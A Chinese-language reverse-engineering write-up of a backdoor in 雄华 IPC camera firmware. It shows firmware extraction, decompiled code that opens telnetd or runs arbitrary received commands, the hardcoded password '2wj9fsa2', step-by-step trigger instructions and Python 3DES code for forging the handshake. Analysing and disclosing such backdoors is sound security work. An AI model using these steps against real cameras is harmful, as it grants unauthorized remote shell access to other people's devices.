### 雄华 IPC 摄像头后门漏洞分析

**环境ubuntu20.04，支持cramfs**

[固件下载](https://gitee.com/emtanling/book/raw/master/XMJ.zip)

#### 解压、分离

```sh
binwalk -Me XMJ.bin 
```

#### 挂载

```sh
for i in *.img ; do mkdir -p /mnt/fw/`basename $i .img` ; dd if=$i of=$i.cut bs=8 skip=8 ; mount -o loop -t cramfs $i.cut /mnt/fw/`basename $i .img` ; done
```

#### 找文件

[文件下载](https://gitee.com/emtanling/book/raw/master/dvrbox.zip)

找到对应文件

![](https://i.loli.net/2021/07/26/MRntzKXo9QL7CIu.png)**即：dvrbox，提取出来进行分析**

搜索字符串：`OpenTelnet:OpenOncess`

```c++
ssize_t __fastcall sub_A7EC(int a1)
{
  int v2; // r9
  int i; // r3
  int v4; // r0
  ssize_t v5; // r8
  ssize_t v6; // r0
  int j; // r8
  size_t v9; // r0
  const char *v10; // r0
  size_t v11; // r11
  size_t v12; // r0
  size_t v13; // r0
  struct timeval timeout; // [sp+14h] [bp-112Ch] BYREF
  _DWORD v16[3]; // [sp+1Ch] [bp-1124h] BYREF
  _DWORD v17[3]; // [sp+28h] [bp-1118h] BYREF
  char s1[16]; // [sp+34h] [bp-110Ch] BYREF
  socklen_t len; // [sp+44h] [bp-10FCh] BYREF
  struct sockaddr addr; // [sp+48h] [bp-10F8h] BYREF
  char v21[32]; // [sp+58h] [bp-10E8h] BYREF
  char v22[32]; // [sp+78h] [bp-10C8h] BYREF
  fd_set readfds; // [sp+98h] [bp-10A8h] BYREF
  unsigned __int8 s[4136]; // [sp+118h] [bp-1028h] BYREF

  memset(s, 0, 0x1000u);
  memset(v17, 0, sizeof(v17));
  memset(v21, 0, sizeof(v21));
  timeout.tv_sec = 15;
  timeout.tv_usec = 0;
  if ( a1 <= 0 )
    return -2;
  len = 16;
  if ( getpeername(a1, &addr, &len) )
    perror("getpeername");
  fprintf((FILE *)stderr, "macGuarder: fd: %d, IP: 0x%x\n", a1, *(_DWORD *)&addr.sa_data[2]);
  v2 = -1;
  while ( 1 )
  {
    for ( i = 0; i != 32; ++i )
      readfds.__fds_bits[i] = 0;
    readfds.__fds_bits[(unsigned int)a1 >> 5] |= 1 << (a1 & 0x1F);
    v4 = select(a1 + 1, &readfds, 0, 0, &timeout);
    v5 = v4;
    if ( v4 <= 0 )
      break;
    memset(s, 0, 0x1000u);
    v6 = recv(a1, s, 0x1000u, 0);
    if ( v6 <= 6 || v6 < s[0] )
      return 0;
    fputs("macGuarder: @@@@ ", (FILE *)stderr);
    for ( j = 0; j++ < s[0]; fputc(s[j], (FILE *)edata) )
      ;
    fputc(10, (FILE *)edata);
    if ( !strncmp((const char *)&s[1], "OpenTelnet:OpenOnce", 0x13u) )
    {
      sub_A7B0(v17);
      printf("randomCode = %s\n", (const char *)v17);
      memset(v22, 0, sizeof(v22));
      sprintf(v22, "%s%s", "randNum:", (const char *)v17);
      v9 = strlen(v22);
      v5 = send(a1, v22, v9, 0);
      if ( v5 == -1 )
      {
        v10 = "send";
LABEL_35:
        perror(v10);
        return v5;
      }
      v2 = 1;
    }
    else if ( !strncmp((const char *)&s[1], "randNum:", 8u) )
    {
      if ( v2 != 1 )
        goto LABEL_20;
      memset(s1, 0, sizeof(s1));
      memset(v22, 0, 0x10u);
      sub_A758(v22);
      sprintf(v21, "%s%s", (const char *)v17, v22);
      memset(v16, 0, 9u);
      v16[0] = v17[0];
      v16[1] = v17[1];
      v11 = strlen((const char *)v17);
      v12 = strlen(v21);
      sub_B920(s1, v17, v11, v21, v12);
      if ( memcmp(s1, &s[9], 8u) )
      {
        puts("verify:ERROR");
        send(a1, "verify:ERROR", 0xCu, 0);
        close(dword_1527C);
        dword_1527C = 0;
        return -4;
      }
      send(a1, "verify:OK", 9u, 0);
      v2 = 2;
    }
    else
    {
      if ( !strncmp((const char *)&s[1], "CMD:", 4u) )
      {
        if ( v2 != 2 )
LABEL_20:
          exit(-1);
        memset(v22, 0, 0x11u);
        v13 = strlen(v21);
        sub_BA14(v22, &s[5], s[0] - 4, v21, v13);
        v5 = strncmp(v22, "Telnet:OpenOnce", 0xFu);
        if ( !v5 )
        {
          system("telnetd");
          puts("Telnet:Open OK...");
          send(a1, "Open:OK", 7u, 0);
          byte_15278 = 1;
          dword_15248 = 1;
          return v5;
        }
        v5 = strncmp(v22, "xmsh:", 5u);
        if ( !v5 )
        {
          puts((const char *)&s[s[0] + 1]);
          system((const char *)&s[s[0] + 1]);
          send(a1, "Run:OK", 6u, 0);
          return v5;
        }
        return -4;
      }
      fputs("macGuarder: Dropped\n", (FILE *)stderr);
    }
  }
  if ( !v4 )
  {
    v10 = "timeout";
    goto LABEL_35;
  }
  perror("select");
  return 0;
}
```

#### 函数分析

经过几次判断可以执行`system("telnetd")`，即为目标。

![](https://i.loli.net/2021/07/26/PeUZD47zINpKQLc.png)

接收数据

![](https://i.loli.net/2021/07/26/sMuigxqhL8ItzHV.png)

前几个为`OpenTelnet:OpenOnce`

![](https://i.loli.net/2021/07/26/Go89yvwRuSdeMP2.png)

sub_A7B0()，返回随机八位整数

```c++
int __fastcall sub_BBE4(int a1, int a2)
{
  bool v2; // nf

  if ( a2 )
    return sub_BB10();
  v2 = a1 < 0;
  if ( a1 > 0 )
    a1 = 0x7FFFFFFF;
  if ( v2 )
    a1 = 0x80000000;
  return sub_BC04(a1);
}
int __fastcall sub_A7B0(char *a1)
{
  unsigned int v2; // r0
  int v3; // r0
  int v4; // r1

  v2 = time(0);
  srand(v2);
  v3 = rand();
  sub_BBE4(v3, 100000000); // 判断rand()的信号状态
  return sprintf(a1, "%08d", v4);
}
```

将发送`ranNum:`加上生成的随机数

![](https://i.loli.net/2021/07/26/UrdMz93HIPpqkc5.png)

如果前几个为`randNum:`

![](https://i.loli.net/2021/07/26/DpO7nz51htkdSYM.png)

sub_A758()

```c++
char *__fastcall sub_A758(char *a1)
{
  int v2; // r0
  int v3; // r5

  v2 = open64("/mnt/custom/TelnetOEMPasswd", 0);
  v3 = v2;
  if ( v2 == -1 ) 	// 判断文件是否存在，不存在返回"2wj9fsa2"
    return strcpy(a1, "2wj9fsa2"); 
  read(v2, a1, 8u); // 存在返回文件前8个字符
  a1[9] = 0;
  return close(v3);
}

```

将随机值与`sub_A758()`返回的值拼接，即构成`key`

![](https://i.loli.net/2021/07/26/eI6HAfPLhVOp24Q.png)

sub_B920()，为[3DES](https://blog.csdn.net/weixin_43943977/article/details/101827362)加密，~~可以通过对比特征或者找加密盒得到~~。

```c++
int __fastcall sub_B920(int a1, int a2, int a3, int a4, int a5)
{
  bool v5; // zf
  int v6; // r5
  signed int v7; // r4
  int v10; // r4
  int i; // r5

  v5 = a4 == 0;
  if ( a4 )
    v5 = a2 == 0;
  v6 = v5;
  if ( !a1 )
    v6 |= 1u;
  if ( v6 )
    return -1;
  v7 = (a3 + 7) & 0xFFFFFFF8;
  if ( !v7 )
    return -1;
  sub_B6B4(a4, a5);
  v10 = v7 >> 3;
  if ( byte_159D0 )
  {
    while ( v6 < v10 )
    {
      sub_B7E4(a1 + 8 * v6, a2 + 8 * v6, &unk_153D0, 0);
      sub_B7E4(a1 + 8 * v6, a1 + 8 * v6, &unk_156D0, 1);
      sub_B7E4(a1 + 8 * v6, a1 + 8 * v6, &unk_153D0, 0);
      ++v6;
    }
  }
  else
  {
    for ( i = byte_159D0; i < v10; ++i )
      sub_B7E4(a1 + 8 * i, a2 + 8 * i, &unk_153D0, 0);
  }
  return 0;
}
```

之后对加密后结果与随机值进行比较，比较正确`verify:OK`。

![](https://i.loli.net/2021/07/26/Euo3epbYjmWBlIz.png)

如果接收的值为`CMD:`

![](https://i.loli.net/2021/07/26/gzw5E8ApK3QuiUl.png)

sub_BA14()，此为[3DES](https://blog.csdn.net/aptweasel/article/details/54601829)解密函数

```c++
int __fastcall sub_BA14(int a1, int a2, int a3, const void *a4, int a5)
{
  bool v5; // zf
  int v6; // r5
  signed int v7; // r4
  int v10; // r4
  int i; // r5

  v5 = a4 == 0;
  if ( a4 )
    v5 = a2 == 0;
  v6 = v5;
  if ( !a1 )
    v6 |= 1u;
  if ( v6 )
    return -1;
  v7 = (a3 + 7) & 0xFFFFFFF8;
  if ( !v7 )
    return -1;
  sub_B6B4(a4, a5);
  v10 = v7 >> 3;
  if ( byte_159D0 )
  {
    while ( v6 < v10 )
    {
      sub_B7E4((a1 + 8 * v6), a2 + 8 * v6, &unk_153D0, 1);
      sub_B7E4((a1 + 8 * v6), a1 + 8 * v6, &unk_156D0, 0);
      sub_B7E4((a1 + 8 * v6), a1 + 8 * v6, &unk_153D0, 1);
      ++v6;
    }
  }
  else
  {
    for ( i = byte_159D0; i < v10; ++i )
      sub_B7E4((a1 + 8 * i), a2 + 8 * i, &unk_153D0, 1);
  }
  return 0;
}
```

解密后是否为`Telnet:OpenOnce`。

![](https://i.loli.net/2021/07/26/eJiALczqUGrPfgd.png)

#### 后门使用

1. 发送`OpenTelnet:OpenOnce`字符串到服务端，接受到`randNum:随机值`。
2. 可以构造key为：`随机值+2wj9fsa2`
3. 发送`randNum:`加上随机值的3DES解密值
4. 发送`CMD:`加上`Telnet:OpenOnce`的3DES的加密值

#### 加解密代码

```python
from Crypto.Cipher import DES3 
import codecs
import base64

class EncryptDate:
    def __init__(self, key):
        self.key = key  # 初始化密钥
        self.length = DES3.block_size  # 初始化数据块大小
        self.aes = DES3.new(self.key, DES3.MODE_CBC, b'12345678')  # 初始化AES,ECB模式的实例
        # 截断函数，去除填充的字符
        self.unpad = lambda date: date[0:-ord(date[-1])]      

    def pad(self, text):
        """
        #填充函数，使被加密数据的字节码长度是block_size的整数倍 
        """
        count = len(text.encode('utf-8'))
        add = self.length - (count % self.length)
        entext = text + (chr(add) * add)
        return entext

    def encrypt(self, encrData):  # 加密函数
        res = self.aes.encrypt(self.pad(encrData).encode("utf8"))
        # msg = str(base64.b64encode(res), encoding="utf8")
        msg =  res.hex()
        return msg

    def decrypt(self, decrData):  # 解密函数
        # res = base64.decodebytes(decrData.encode("utf8"))
        res = bytes.fromhex(decrData)
        msg = self.aes.decrypt(res).decode("utf8")
        return self.unpad(msg)


eg = EncryptDate("159124332wj9fsa2")  # 这里密钥的长度必须是16的倍数
res = eg.encrypt("Telnet:OpenOnce")
print(res)
eg1 = EncryptDate("159124332wj9fsa2") 
print(eg1.decrypt(res))
```

#### 参考博客

* [POC](https://github.com/Snawoot/hisilicon-dvr-telnet/blob/master/hs-dvr-telnet.c)

* [GNU/Linux и устройство на Rockchip 2918](https://habr.com/ru/post/147793/)
* [Burn-in рутовый шелл в IP-камерах Vesta и не только](https://habr.com/ru/post/173501/)
* [How to repack an img file extracted from a device firmware?](https://unix.stackexchange.com/questions/223317/how-to-repack-an-img-file-extracted-from-a-device-firmware)
* [Cramfs - cram a filesystem onto a small ROM](https://www.kernel.org/doc/Documentation/filesystems/cramfs.txt)
